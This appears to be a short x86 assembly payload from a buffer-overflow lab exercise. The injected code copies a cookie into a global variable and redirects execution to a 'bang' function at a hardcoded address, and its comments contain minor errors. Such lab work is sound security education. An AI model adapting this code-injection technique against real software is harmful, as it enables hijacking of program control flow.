mov 0x804d108,%eax       # get the cookie value by address, not the value  
mov %eax,0x0804d100      # put the cookie value to globe_value
push $0x08048c9d         # push the bang entry address to the stack
ret                      # return to the bang function
